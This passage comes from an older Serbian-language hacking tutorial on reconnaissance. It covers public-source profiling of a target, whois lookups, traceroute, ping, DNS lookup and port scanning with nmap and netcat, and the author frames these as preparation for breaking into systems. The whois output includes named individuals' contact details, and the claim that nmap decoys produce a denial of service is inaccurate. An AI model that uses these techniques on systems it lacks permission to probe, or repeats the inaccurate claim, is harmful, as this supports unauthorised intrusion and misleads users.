ce vam znacajno olaksati posao osvajanja i dominacije nad zrtvom.
  Raznim opipavanjima i snimanjima moze napraviti profil zrtve.
Hakeri u te svrhe koriste razlicite metode i jedina prepreka ce biti vasa masta
i naravno znanje. Za znanje cu se potruditi da ga malo dopunim
  Da bi uspesno izvrsili sistematsko popisivanje i skupljanje svih tih delova
informacija u jednu celinu morate imati dobru metodologiju.
Morate odvojiti kljucne podatke od onih koji to nisu, iako svakako nema bespotr-
ebnih informacija. Mozda je ova faza,tj faza snimanja sistema i najmucnija medj-
utim neophodna je. Svakako da moze biti i zanimljiva kada otkrijete vazne infor-
macije.

   ..[=-< Public Sources
   .
   .
   
  Prvi korak je skupljanje informacija iz javnih izvora.
Ukoliko napadate neku organizaciju prvo sto radite je svakako da posetite njih-
ovu oficijelnu web stranicu.
Obicno se na web stranicama daju mnogo korisne informacije poput:

  [=- Adresa
  [=- Brojevi telefona
  [=- Zaposleni
  [=- Politika organizacije
  [=- E mail adrese za kontakte
  [=- E mail adrese zaposlenih
  [=- Pravila organizacije
  [=- Srodne organizacije
  [=- Linkovi ka drugim sajtovima organizacije
   
   .....itd
   
  Pretrazujte tu web stranu detaljno,jel se gomile informacija mogu iskorsititi
npr u svhr Social indzinjeringa, ali i u druge svrhe.

Pretrazivanje javnih izvora je jos lakse.
Zasto ne koristiti nesto tako mocno kao sto je GOOGLE.Pa on ima obilje informa-
cija o svemu i svacemu. Sigurno cete nesto naci u vezi vase mete sto mozete
iskoristiti na vama pogodan nacin. Google botovi su sve razvijeniji i razvijeniji
malim proucavanjem naprednih tehnika pretrage mozete doci do odlicnih rezultata.
  Zatim pretrazivanjem USENET poruka. Na USENTE grupama organizacije cesto odaju
informacije koje mozete iskoristiti tipa, kakve su sigurnosne propuste imali,
sta ih muci, koji su njihovi problemi, kako implementiraju sigurnosne zakrpe itd.
Zamislite admina neke organizacije koji dodje i pita npr "Imam problema sa 
2.4.26 kernelom nece da patchuje novi uselib() propust. To je vasa sansa :).
Nacini su brojni.
  Sto se tice pretrage mozete koristiti sledece izvore;
  
   [=- www.google.com
   [=- www.yahoo.com
   [=- www.alatavista.com
   [=- www.hotbot.com
   [=- www.dogpile.com   ---ovo posebno ispitajte
   
 Ukoliko je vasa meta neka kompanija vazno je da pratite trzisne tj poslovne
sajtove i da po njima trazite informacije o datoj kompaniji.
Primer:

http://www.sec.gov/

Americka komisja za promet novca i hartija od vrednosti koja koristi EDGAR bazu.
Mogucnosti su beskrajne...


   ..[=-< Domain searching
   .
   .
   
  U svrhe sto kvalitetnijeg prikupljanja informacija mozete se korsititi i
metodom pretrazivanja domena.
Pretrazivanje domena moze izvrsiti npr korisnim UNIX utilom /*whois*/,koji
ce izvrsiti upit u baze registara.
Znaci mozemo zatraziti listu demena koji se odnose na zrtvu.
Npr mozemo da upit posaljemo Network Solutions registru.

   ==---------[code]----------== 
   bash-2.05b# whois 212.46.62.100
% This is the RIPE Whois query server #2.
% The objects are in RPSL format.
%
% Rights restricted by copyright.
% See http://www.ripe.net/db/copyright.html

inetnum:      212.46.56.0 - 212.46.63.255
netname:      SBM-NET-SA
descr:        Saudi Business Machines
country:      SA
admin-c:      MAK46-RIPE
tech-c:       HA140-RIPE
status:       ASSIGNED PA
mnt-by:       SBM-SA23
changed:      sys1@sbm.net.sa 20050210
source:       RIPE

route:        212.46.32.0/19
descr:        Saudi Arabia backbone and local registry address space
descr:        sbm.net.sa
origin:       AS8895
notify:       abuse@sbm.net.sa
mnt-by:       ISU-NOC
changed:      abuse@sbm.net.sa 20000704
changed:      hostmaster@ripe.net 20000710
source:       RIPE

person:       Mohammed Akef
address:      Saudi Business Machines
address:      P.O. Box 5648 Jeddah 21432 KSA
phone:        +9662 660 0007
fax-no:       +9662 665 1163
e-mail:       halhazmi@sa.ibm.com
nic-hdl:      MAK46-RIPE
changed:      halhazmi@sa.ibm.com 20050120
changed:      hostmaster@ripe.net 20050120
source:       RIPE

person:       Hani Al-Hazmi
address:      P.O. Box 5648 Jeddah 21432 KSA
phone:        +9662 650 3777 ext. 4206
fax-no:       +9662 652 1218
e-mail:       sys1@sbm.net.sa
nic-hdl:      HA140-RIPE
changed:      sys1@sbm.net.sa 20020113
source:       RIPE
   ==---------[/code]---------== 
  
 Izvrsili smo jednostavan upit, iz kog mozemo saznati obilje informacija.
Ne zelim objasnjavati svaku informaciju posebno, ovaj primer sve govori.

   ==---------[code]----------== 
bash-2.05b# whois -H www.cnn.tv
cnn.tv

Registrant:
         TM Group  (tmgroup@turner.com)
        Turner Broadcasting System, Inc.
        One CNN Center
        Atlanta, GA  30348
        US
        404-827-3602


Domain Name: cnn.tv




Administrative, Technical, Billing Contact:
         TM Group  (tmgroup@turner.com)
        Turner Broadcasting System, Inc.
        One CNN Center
        Atlanta, GA  30348
        US
        404-827-3602





   Record created on Feb 16 2001.
   Record expires on Feb 16 2006.
Domain servers:
        twdns-01.ns.aol.com
        twdns-02.ns.aol.com
        twdns-03.ns.aol.com
        twdns-04.ns.aol.com


You have used the whois service 1 / 20
   ==---------[/code]---------== 
   
  Koristeci -H opciju zaobisli smo Legal Desclaimer koji se prikazuje i uspesno
smo dobili rezultate pretrazivanja domena cnn.com

Takodje nemorate koristite UNIX utile kako bi dosli do rezultata dovoljno je da
odete na oficijelne sajtove whois servera i tamo izvrsite upite.
Npr posetite sajt networksolutionsa ili arin.net

   [=- www.networksolutions.com
   [=- www.arin.net
   
   
   ..[=-< Tracerouting
   .
   .
   
  Jos jedna metoda za upoznavanje mreze je tracerouting.
Tracerouting mozete izvesti uz pomoc UNIX utila /*traceroute*/,koga mozete naci
na svakom UNIX sistemu. Inace TRACEROUTE  je alatka za dijagnozu i koristi metode
vremenskih opcija prezivljavanja paketa tj TTL (time to live).
Kada ruter primi paket on TTL vrednost smanjuje za 1, a TTL postaje brojac skoko-
va tj HOPSA,Sa rutera se salje ICMP poruka TIME_EXCEEDED.
Tako uz pomocm tc mozemo utvrditi putanju kretanja paketa.
Navescu jedan kratk primer, kuda sve proputuje paket poslat sa moje masine

   ==---------[code]----------== 
   bash-2.05b# traceroute 212.62.46.100
   traceroute to 212.62.46.100 (212.62.46.100), 30 hops max, 38 byte packets
   1  10.2.5.1 (10.2.5.1)  8.038 ms  6.419 ms  7.187 ms
   2  212.62.46.100 (212.62.46.100)  6.860 ms  7.023 ms  5.854 ms
   ==---------[/code]---------==   
   
  Kao sto vidimo paket prolazi samo kroz jednu tacku pre nego sto stigne do kr-
ajnje destinacije,a to je 212.45.100. On prolazi samo kroz tacku 10.2.5.1 sto je
moj gateway. Naravno da ce u slucajevima trrutovanja tudjih sistema ispis biti
mnogo mnogooo veci i da cete morati pomno da proucavate kuda se krecu ti paketi.
Maravno ne propustaju svi ruteri traceroute zahtev.

Ukoliko koristimo -I opciju umesto UDP datagrama slacemo ICMP ECHO zahteve.
Za ostale opcije vidite #man traceroute




   
   
   
   
   
   
     
   
   ==-[ 0x02b % Port Scanning
   
   ..[=-< Intro
   .
   .	   
	      
   
  Jedna od svakako najpopularnijih metoda za saznavanje informacija o ciljanom
sistemu. Skeniranje  {eng: scaning},predstavlja osnovnu tehniku svakog
"hakera". To je pocetni element bez koga nema dalje. Savladavanje tehnika skenira-
nja uopste nije tesko niti naporno , naprotiv veoma je zanimljivo i poucno.
 Skeniranje znaci opipavanje sistema...mozda je slikovito objasnjenje....kao kad
se lopov raspituje kad zeli da provali u neku kucu, koji su prozori otvoreni
kako bi lakse usao, pa da...:)
   Znaci za skeniranje se koriste alati koji se nazivaju *port scaneri*.Preko 
njih mozete saznati niz informacija kao sto je OS sistem koji runuje na hostu,
aktivni servisi,otvoreni portovi....
Mnogi vole da koriste lepe *GUI*.aplikacije koje sebe nazivaju scan-
erima i da se hvale drugovima /*wauu vidi ovom otvoren port 21*/
,medjutim po meni vredi ceniti samo alate koje rade u konzolnom
rezimu ne jer oni izgledaju 1337 vec zato sto je nad njima izvrsiti
ispravke,automatizaciju ,a o kontroli koje oni pruzaju da ne pricam.
  izuzetak je Nessus koga smatram veoma vrednim alatom mada je ipak malo lame 
  zbog svog lepog GUI-a i zbog toga sto ce vam na zadatom
hostu prikazati sve rupe i vuln's bez da se mucite. Dace vam i opis te rupe i 
njen faktor rizika tako da na vama je samo da odete na npr *securityfocus.com* 
i skinete *exploit*...i wopalaa ...bTw fuck th4t shit ^H^H^H^H
Meni je mnogo drazi npr nmap i nc mada nc nije port scaner u
osnovi mada moze sluziti i za to.
  Znaci scaniranjem cete otkriti moguca mesta na koja mozete
provaliti,moguce rupe itd...

   Ova sekcija obuhvata najsesce koriscene alate,koji se upotrebljavaju u domenu
skeniranja.Alate koje cu nabrojati se mogu naci sam na UNIX platformi jer 
*windoze* nemam zelju da opisujem, mada se vecina mogu naci i kao portovane 
verzije na winshitu. Sve alate mozete naci na netu koristeci *google*, ili drugi
referenti pretrazivac ili na *security* sajtovima koje cu navesti. Ovde cete nai-
ci na kratak opis alata vez nekoh vecih objasnjenja i laprdanja, jer cete to
naci i drugim sekcijama ovdeje samo vodic kroz alate, tj kako da se opremite 
za postupak scaniranja. Neke alate i utile cete po defaultu imati na UNIX masini
,mada opet zavisi od distroa.
  Vecina ako ne i svi su OpenSource i pod GPL licencom sto znaci 
da su za dostupni svima bez naplate. Takodje mozete vrsiti razne modifikacije 
nad njima onako kako vama to odgovara.
  Ovo nisu nikakvi <super mega-giga hakerski alati> vec utili
koji ce vam takodje pomoci da zastitite svoj racunar, da se odbranite
ali ako ga koristite za napad na ciljanu mrezu takodje su od pomoci.  


   ..[=-< Tools
   .
   .	   
	   


   [=-   nMAP ----Network mapper. Mozda medju narodom najpopularniji scaner
           Cak se pojavio i u Matrixu 2 kada ga Trinity koristi
	   za exploitovanje sistema.
	   Radi iz koamnde linije koristeci sintaksu
	   #nmap -opcije host
	   pri cemu ima ogroman broj opcija kojima mozete modifikovati
	   defaultni izlaz.
	   Tu je i graicka  varijanta koju pokrecete sa
	   #nmapfe
	   Ima lep *GTK* GUI i tipican windozoliki *click&run* sistem.
	   Postoji i port na windozi i zove se nmap32, mada nisam siguran 
	   u njegovu stabilnost i rad.
	   Znaci nMap sluzi za skeniranje portova i to kako TCP tako i UDP.
	   Ima ogorman broj mogucnosti.
	   *Fyoodro* se hvali time kako je nmap veoma *stealth*
	   mada i to varira naravno.
	   Veoma je brz kad se radi o scanu vecih mreza.Vise o njemu
	   u tutorialu _SaBB_-a
	   URL:www.insecure.com

	   
	   
   [=-   nc   ---ili *NetCat* u osnovi nije port scanner,mada omogucava i tako 
          nesto.Cak i u tome polju je veoma dobar.
          Cesto ga u geekoviskim krugovima nazivaju "Svajcarski perorez" zbog
	  njegove multifunkcionalnosti. On sadrzi ogroman broj opcija tako da bi
	  lepo bilo da procitate man stranicu nc.
	  Zaista to je ogromno podrucje koje treba preci jer nc ima sijaset
	  mogucnosti koje vam drugi alati ne pruzaju.
	  Po meni uopste nije lame tool tako da ce n00bzi imati mozda 
	  problema sa njim u pocetku.
	  Napisao ga je hobbit <hobbit@avian.org>.
	  U sluzbi port scannera moze skenirati i TCP i UDP prikljucke.
	  Postoji i kriptovana verzija nc koja se naziva *cryptcat*.
	  O net catu ce biti mnogo reci u daljem delu tuta.
	  Moze raditi i u server tj prislusnom modu kada je u stanju da prima i
	  odbija konekcije. Cak sa moze koristiti i kao simple sniffer uz pomoc
	  odlicnog hex dump sistema.
	  
   [=-  strobe ---po meni koristan alat,ako ne zbog necega drugog onda bar zbog
           cinjenice da se lako mogu videti verzije servisa koji slusaju.
	   On ce bukvalno oteti zaglavlje servisu i tako ga identifikovati.
	   Takodje pecizno vrsi pogadjanje OS na b0xu.
	   Napisao ga je Julian Assange.
	   Veoma se lako moze optimizovati za brz rad na velikim mrezama.
	   Veoma vazno je da skenira samo TCP portove, a ne skenira udp.
	   Za to nek vam posluzi *udp_scan*, koji vrsi scan samo *UDP*
	   portova.
	   
   [=-  Nessus ---Nessus nije klasican port-scanner kao nMap,vec je vuln
           scanner. To znaci da pored skeniranja portova on prikazuje
	   rupe i vuln's na servisima koji slusaju na tim portovima.
	   Nessus ima ogromnu bazu rupa i vuln's-a.
	   Ima *GTK* interfejs, sto vam omogucava laku upotrebu.
	   Njegova moc lezi i u brojnim pluginovima koje mozete
	   skidati sa neta for =free=.
	   Sadrzi veliki broj opcija tako da je najbolje da procitate
	   njegov hel ili jos bolje Tutorial za Nessus sa *securityfocusa*
	   kako bi se sto boje upoznali sa radom istog jer ja cu
	   njega opisati nesto malo u ovom tutorialu jer bi ovo 
	   onda bila knjiga, a ne mali tut.
	   Takodje uz nessus dolazi nessusd koji mora biti pokrenut
	   kako bi nessus klijent radio.
	   URL:www.nessus.org
	   
   [=-  SATAN  ---SAAN je stariji scanner koji je dugo vremena bio omiljen kod 
           "hakera".Sada ga je zamenio njegov noviji clon SAINT.
	   Ne bih mogao mnogo sta reci  o SATAN-u jer ga iskreno
	   nisam nista preerano koristio, a i to koriscenje
	   se svodilo na neke lame stvari tako da nisam mogao iskusti 
	   njegovu moc.Naveo sam ga samo jer je popularan
	   ,a ako vam nessus i ostali nisu dovoljni probajte SATAN.
	   
  ... to bi ukratko bili alati koji su "i must have". Njihovo daljnje proucavanje
ce vam samo pomoci u procesu skupljanja informacija, jel su to obimni alati sa
dosta opcija dosta funkcija, a nadasve su alati koji su preko potrebni i koje
cete mnogo koristiti.

   	 

   ..[=-< Scan types
   .
   .	   
   
   
   [=- TCP connect scan ----ovo je potpuno povezivanje sa ciljanim
                            sistemom. Izvrsava se trostepeni-handshake
		            Ovo se veoma lako otkriva. To je osnovni
		            nacin scaniranja.
		       
   [=- TCP SYN          ----naziva se jos i *half-open* skeniranje,
                            jer ne dolazi do potpune upostave veze.
		            Diskretnije je i mozda ga sys nece ni 
		            zabeleziti.
     	                    Odvija se tako sto se ciljnom sistemu salje
	 	            SYN paket a ukoliko se vrati RST ili ACK
		            znaci da port nije aktivan.Dok ukoliko
	 	            se vrati SYN/ACK port slusa.
		            Ako port slusa salje se ACK/RST cime se prekida
		            tj onemogucuje konekcija.
		       
   [=- TCP FIM          ----Salje se *FIN* paket za koji sam vec rekao zasta 
                            sluzi. Ukoliko se od hosta vrati RST znaci da je 
	    	            port zatvoren.
		       
   [=- TCP RPC          ----Ono je rezervisano za UNIX sisteme,jer na njima 
                            mogu biti aktivne RPC usluge tj Remote Call Procedur
		            koji omogucava daljinsko pozivanje procedura preko
		            odredjenih portova. RPC usluge su veoma opasne
		            i pune bagova pa se ne preporucuje da budu aktivne.
		       
   [=- TCP ACK          ----Pomocu ovakve vrste skeniranja mogu se otkriti 
                            *firewallovi*. Znaci ovim scaniranjem ce se utvrditi
		            moguce barijere koje filtriraju pakete.
		       
   [=- Null TCP scan    ----Ovo tehnikom skeniranja se iskljucju svi identi-
                            fikatori. Onda host vraca RST pakete za svaki zatvor-
			    eni port.
		       
   [=- Xmas tree        ----veoma izrazeno u nMapu. Salje se paket FIN kao i neki
                            nestandardni paketi *PUSH*,*URG*. Host vraca RST
		            za svaki zatvoren port.
		       
   [=- UDP scan        -----Skeniranje User datagram Protocola.
                            Tehnika se sastoji od slanja jednog paketa preko
		            UDP porta i ako ciljani sys odgovri ICMP porukom
	                    "ICMP port unreachable" znaci da je port zatvoren.
 		            Ako poruke nema moze se zakljuciti da je port open.
			    Mada nemojte biti 100% sigurni u rezultate 
			    ovakvog nacina scana.
	     

   ..[=-< Finding Target
   .
   .	
   
  Pre samog cina skeniranja portova, vazno je znati jos par sitnica,tipa dali je
taj host uopste up? Dali je na internetu, zatim potrebno je znati njegovu ip ad-
resu u nekim slycajevima i jos niz sitnica. Ovo poglavlje ce se potruditi da vam
ukaze na te preko potrebne sitnice koje ce vam trebati.

  Prvo cemo krenuti sa pingovanjem.
Iako ste sihurno mnogo puta culi za rec "ping", mozda je niste preterano koritili
ili je mozda niste koristili u prave namene.
Otprilike svaki pocetnik misli da je ping nesto sa cime mozes srusiti server 
ako kucas dovoljan broj paketa tj zahvteva. Naravno da postoje tehnike kojima je
uz pomoc pinga ovo izvodljivo ali u osnovi ping sluzi za otkrivanje zivih 
sistema u mrezi.
  To znaci da ukoliko zelimo da vidimo da li je neki sistem budan mi cemo mu 
poslati pingom poslati *ICMP* paket *ECHO* (tipa 8), a ako host uzvrati sa ICMP
ECHO paketom *ECHO_REPLY* host radi tj budan je.
  Ping je veoma koristan kada su u pitanju manje mreze korisno ga je korsiti i 
u *LAN*-u,moze se videti i kakav je saobracaj izmedju racunara, ali ga je tesko 
koristiti npr za mreze klase A....uff trajalo bi danima.
Medjutim moze doci do gresaka ukoliko je na hostu  blokiran ICMP saobracaj pa 
to morate imati na umu.

Util ping dolazi na svim UNIX, ali i na win sistemima.
Uz njega imate i opseznu dokumentaciju.
Klasican ping izgleda ovako na mom b0xu:

   ==---------[code]----------==
   root@l0v3x0r:~# ping
   Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
            [-M mtu discovery hint] [-S sndbuf]
            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
   ==---------[/code]---------==
   
 Krenucemo sa pingovanjem neke ip adrese kako bi utvrdili dali je ziva.

    ==---------[code]----------==
    bash-2.05b# ping 212.62.46.100
    PING 212.62.46.100 (212.62.46.100) 56(84) bytes of data.
    64 bytes from 212.62.46.100: icmp_seq=1 ttl=63 time=6.05 ms
    64 bytes from 212.62.46.100: icmp_seq=2 ttl=63 time=9.64 ms
    64 bytes from 212.62.46.100: icmp_seq=3 ttl=63 time=8.37 ms

    --- 212.62.46.100 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 2020ms
    rtt min/avg/max/mdev = 6.052/8.022/9.645/1.489 ms
    ==---------[/code]---------==
    
  Kao sto vidimo host koga smo naveli je uspesno odgovorio na sve zahteve sto
znaci da je host up i da nema gubitaka u prenosu podataka.

Mogli bismo malo razjasniti neke opcije ping utila kako bi nam bilo lakse u da-
ljnjem radu.

    [=- q -q opcija prebacuje ping u quite mode pri cemu
           ping nece na *STDOUT* izbacivati rezultate tj
	   necete videti nista na monitoru sve dok ping ne 
	   zavrsi ili ga vi prekinete sa <CTRL+C>
	   
    [=- -s definise vrednost packetsize.Specifira broj podatka
           koji se salje.Default je 56.
	   
    [=- -t -Time to Live (TTL)
  
    [=- -T -veoma zanimljiva opcija.Tzv timestamp.
            posle parametra -T navodi se timestamp option
	    koji moze biti *tsonly* (samo timestamp) ili npr
	    *tsandaddr* ((i adrese i ts))
	   
    [=- -U -Stampa puni user-to-user latency.
  
    [=- -w -pecifira odmor u sekundama,pre nego sto
            ping izadje.
	  
    [=--r  -Koristi se za hostove u mrezi.
  
    [=- -l -preload opcija.ping salje toliko paketa
            koji ne cekaju reply koliko je navedeno
	    u opcijama.
	  
    [=- -I -vrsi ping na odredjeni mrezni uredjaj.Posle
           -I navedes mrezni uredjaj.kod vas probajte sa npr lo
	    (tj localhost,loop back interface).ili eth0
	    za mreznu..ako ovo dole bude pisalo jasno nemate
	    taj uredjaj.
	    
    ==---------[code]----------==	    
    root@l0v3x0r:~# ping -I eth0  127.0.0.1
    |connect: No such device
    ==---------[/code]---------==
    
    [=- -i -uz nevedenih broj u sekundma predstavlja interval
            izmedju slanja svakog paketa.Po meni veoma korisno.
	    
    ==---------[code]----------==	    
    root@l0v3x0r:~# ping -i 3  127.0.0.1
    ==---------[/code]---------==
    
    [=- -f -FLOOD opcija moze se pokrenuti samo kao root
            user,ukoliko se navede 0 kao argument.
	    Za svaki ECHO_REQUEST stampa 
	    "." (tacka).
	    Dok za svaki ECHO_REPLY vrsi brisanje (backspace)
	    Sada cu naveci jedan primer:   

    ==---------[code]----------==
    root@l0v3x0r:~# ping -f 0  127.0.0.1
    |PING 127.0.0.1 (127.0.0.1) 56(124) bytes of data.
 |  ............................................................................
    ............................................................................
    ......................||....................................................
    .............................................................|..............
    ............................................................................
    ....................|.......................................................
    ..........................................................|.................
    ............................................................................
    ..127.0.0.1 ping statistics ---
    |1655 packets transmitted, 0 received, 100% packet loss, time 26291ms
,   |ipg/ewma 15.895/0.000 ms
    ==---------[/code]---------==
    
  Pokrenite TCPDUMP kako bi videli sta se desava.
  
    ==---------[code]----------==
    oot@l0v3x0r:~# tcpdump
    tcpdump: WARNING: Promiscuous mode not supported on the "any" device
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on any, link-type LINUX_SLL (Linux cooked), capture size 96 bytes
    00:56:16.349568 IP localhost > localhost: icmp 64: echo request seq 845
    00:56:16.360155 IP localhost > localhost: icmp 64: echo request seq 846
    00:56:16.379363 IP localhost > localhost: icmp 64: echo request seq 847
    00:56:16.389381 IP localhost > localhost: icmp 64: echo request seq 848
    00:56:16.399526 IP localhost > localhost: icmp 64: echo request seq 849
    00:56:16.410177 IP localhost > localhost: icmp 64: echo request seq 850
    00:56:16.429473 IP localhost > localhost: icmp 64: echo request seq 851
    00:56:16.439546 IP localhost > localhost: icmp 64: echo request seq 852  
    | 493 packets captured
    990 packets received by filter
    |0 packets dropped by kernel    	   
    ==---------[/code]---------==     
  
   ----ovo je samo deo ispisa jer je on ogroman. Iz ovog ispisa mozemo saznati
ip sa kog se flood radi,vreme,velicinu paketa i tip naravno zahteva.
 vidimo da je kod mene flood vrsen sa localhost adrese.
 
   [=- -c -uz navedeni broj oznacava koliko se paketa salje.Ako navedemo
           3 poslace se tri ECHO_REQUEST-a
	   
  Pingovanje se moze vrsiti takodje sa raznim drugim alatima.Navescu primer
koriscenja nmapa u svrhu utvrdjivanja prisutnosti hosta.
nMap salje pakate na port 80 po defaultu jer vecina FW i Routera odobrava saob- 
racaj preko tog porta. Ako ne dobijemo odgovor moze sa sigurnoscu tvrditi da je 
host iskljucen.	   

    ==---------[code]----------==
    | root@l0v3x0r:~# nmap -PT localhost

    Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-08-05 01:16 UTC
    Interesting ports on localhost (127.0.0.1):
    (The 1656 ports scanned but not shown below are in state: closed)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    6000/tcp open  X11
   
   | Nmap run completed -- 1 IP address (1 host up) scanned in 0.791 seconds    
    ==---------[/code]---------== 
    
  Takodje mozemo izvesti nmapom skeniranje mreze signalom ping.
Za to cemo koristiti opciju -sP.  

    ==---------[code]----------==
      | root@l0v3x0r:~# nmap -sP 127.0.0.1/24

  Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-08-05 13:24 UTC
  Host 127.0.0.0 seems to be a subnet broadcast address (returned 1 extra pings).
   Host localhost (127.0.0.1) appears to be up.
   Host 127.0.0.2 appears to be up.
   Host 127.0.0.3 appears to be up.
   Host 127.0.0.4 appears to be up.
   Host 127.0.0.5 appears to be up.
   Host 127.0.0.6 appears to be up.
   Host 127.0.0.7 appears to be up.
   Nmap run completed -- 256 IP addresses (255 hosts up) scanned in 4.589 seconds       
   ==---------[/code]---------==     
   
 Ukoliko je na nekom sistemu ICMP saobracaj blokiran neki usmerivacem ili
FW,sto se moze desiti ukoliko se xtra vodi racuna o sigurnosti, postoji jos par 
tehnika kojima mozemo otkriti da li je host budan.
    
    [=- -Port scanning ---znaci ako imas otvorenih prikljucaka host je budan
                           Ova tehnika nije sigruna 100%.
			
    [=- -TCP scanning  ---O ovome sam vec pricao salje se SYN/aCK paket
                          kad se dobije RST hos je ziv.  
    ==---------[code]----------==			  
    root@l0v3x0r:~# nmap -sP -PT80 127.0.0.1/24
    ==---------[/code]---------==  
    
   --...znaci najbolje je scanirati 80 port jer je on najcesce otvoren mozete 
jos probati sa smtp(25), pop(110), imap(143)   

 /*Kako bi sebe zastitili od Pingovanja tj kako biste otkrili ko vas pinguje,
  koristite sniffere, ipchains ili iptables i *snort* (www.snort.org) alat za
  tetekciju upada.
  Takodje mozete zabraniti ICMP saobracaj sto se ne preporucuje jer moze
  doci do gresek pri radu mnogih programa, mada mozete ograniciti saobracaj
  i odrediti poruke koje se salje ICMP.
  
  Za takve stvari preporucujem pingd koji ce iz kernela iskljuciti podrsku
  za ECHO i ECHO_REPLY i on ce voditi racuna o ping zahtevima.*/
  
  Sada cemo pomenuti util HOST koji ce u najprostijem rezimu izvrsiti prevod iz
IP adrese u ime domena ili  obratno. Znaci izvrsice tzv DNSlookup.

    ==---------[code]----------==
    bash-2.05b# host www.severina.com
    www.severina.com has address 207.44.194.79
    ==---------[/code]---------==   
    
  Iz ovog primera mozemo videti kako smo dosli do saznanja IP adrese hosta
www.severina.com

  Zadnju stvar koju cemo pomenuti u ovoj sekciji jeste NSLOOKUP util.
On ce takodje izvrsiti DNSlookup kao i host i dobicemo prevedenu IP adresu.
    
    ==---------[code]----------==
    Non-authoritative answer:
    Name:   www.severina.com
    Address: 207.44.194.79
    ==---------[/code]---------==
    
 Kada smo nasli nasu metu nasli njen IP i utvrdili da je konektovana na mrezu
 krenucemo dalje u borbu za informacije.
  

 
   ..[=-< Ready to go!
   .
   .	     
   
   Kada imamo neke osnovne informacije kao sto je IP adresa, ime hosta i potvrdu
da je host budan moze otpoceti sa skeniranjem.
  O portovima sam vec pricao ali prostim jezikom to je put kojim mozete uci u 
tudji sistem.
Naravno da se mogu iskoristiti samo *OPEN* portovi.
Kako bismo saznali koje portove imamo otvorene koristimo razlicite alate koje
nazivamo *port scanneri*. Za port scan ce biti najbolje koristiti nmap koji sad-
rzi veliki broj opcija i mogucnosti.
Najjednostavnije skeniranje se pokrece samo sa komandom #nmap:

    ==---------[code]----------==
    root@l0v3x0r:~# nmap 127.0.0.1
   
    Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-08-08 13:20 UTC
    Interesting ports on localhost (127.0.0.1):
    (The 1656 ports scanned but not shown below are in state: closed)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    6000/tcp open  X11
    
    |Nmap run completed -- 1 IP address (1 host up) scanned in 1.038 seconds
    ==---------[/code]---------==
    
  Ovo je primer mog skeniranja localhosta.Kao sto vidite uz komandu nmap cemo 
dodati i ip adresu sistema kog skeniramo.nMap ce dati output na ekran iz kog 
mozemo videti da su otvoreni portovi 22(ssh), 80(http),6000(x11). Kod vas moze 
biti mnogo vise portova otvorenih ili mozda i manje. Naravno to zavisi od sistema
ili od same konfiguracije sistema. Ja sam podesio tako da koristim SSH (Secure 
Shell) umesto telnet ili ftp klijenta http naravno za WEB tj surfovanej netom i
port 6000 kroz koji se moze uspostaviti X tunel i konekcija sa X serverom tj X
windows systemom. Na kraju mozemo videti da je nmap nasao jednu IP adresu jer
smo mu jednu i zadali.
   
  Mozemo pomenuti i *ident scan*,tj skeniranje identiteta.Pomocu njega mozemo 
utvrditi id korisnika odredjenog TCP prikljucka, a to se postize skupljanjem 
informacija sa porta 113. Znaci videcemo vlasnika procesa koji se obavlja kroz 
prikljucak. Ovo je najizrazenije na UNIX sistemima.    

    ==---------[code]----------==
    PORT     STATE SERVICE OWNER
    22/tcp   open  ssh
    80/tcp   open  http
    6000/tcp open  X11 
    ==---------[/code]---------==  
    
 Mozemo primetiti da je dodata kolona *owner* koja oznacava vlasnika procesa.
 
 Jedna od veoma vaznih sitnica da tako kazem jeste da sacuvate scan rezultate u 
jedan fajl citljivog formata ovo ce vam takodje omoguciti nmap.   

    ==---------[code]----------==
       | root@l0v3x0r:~# nmap 127.0.0.1 -oN blood
   
    Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-08-08 13:35 UTC
    Interesting ports on localhost (127.0.0.1):
    (The 1656 ports scanned but not shown below are in state: closed)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    6000/tcp open  X11
   
    Nmap run completed -- 1 IP address (1 host up) scanned in 0.678 seconds
    |root@l0v3x0r:~# cat blood
    # nmap 3.50 scan initiated Sun Aug  8 13:35:09 2004 as: nmap -oN outfile 
    127.0.0.1
    Interesting ports on localhost (127.0.0.1):
    (The 1656 ports scanned but not shown below are in state: closed)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    6000/tcp open  X11
   
    Nmap run completed at Sun Aug  8 13:35:09 2004 -- 1 IP address (1 host up) 
    scanned in 0.678 seconds
    ==---------[/code]---------== 
    
 Kao sto ste videli ovo se postize opcijom -oN i imenom fajla.Time cemo sni-
miti fajl koji ce sadrzati rezultate scana u citljivom formatu.  
 
 Ovo ce zanimati sve lamera a to je da pomocu nmapa mozete izvesti i *DoS*
 (denial of Service).
To cemo izvesti -D flagom,koji ce ciljani sistem zatrpavati laznim informacijama
i IP adresama sa kojih se vrsi scan. To ce vas na neki nacin i zastititi od 
otkrivanja jer ciljani sistem  nece stici da razluci koje su prave a koje ne ip 
adrese. Ukoliko znaci ne navedemo aktivne IP adrese moze doci do DoS-a. To je 
tipican SYN flood.

    ==---------[code]----------==
    oot@l0v3x0r:~# nmap -sS 127.0.0.1 -D 10.0.0.1
    
    Starting nmap 3.50 ( http://www.insecure.org/nmap/ ) at 2004-08-08 13:38 UTC
    Interesting ports on localhost (127.0.0.1):
    (The 1656 ports scanned but not shown below are in state: closed)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    6000/tcp open  X11
    
    Nmap run completed -- 1 IP address (1 host up) scanned in 4.238 seconds
    ==---------[/code]---------== 
    
  Skeniranje portova mozemo videti i pomocu *nc* iliti *netcat*-a.
Mada on nije namenjen prevashodno za port scan mozemo ga upotrebiti i za to.
O njemu ce biti vise reci u nekoj od sledecih sekcija.
    
    ==---------[code]----------== 
    root@l0v3x0r:~# nc -v -z 127.0.0.1 1-100
    localhost [127.0.0.1] 80 (http) open
    localhost [127.0.0.1] 22 (ssh) open
    ==---------[/code]---------==     
    
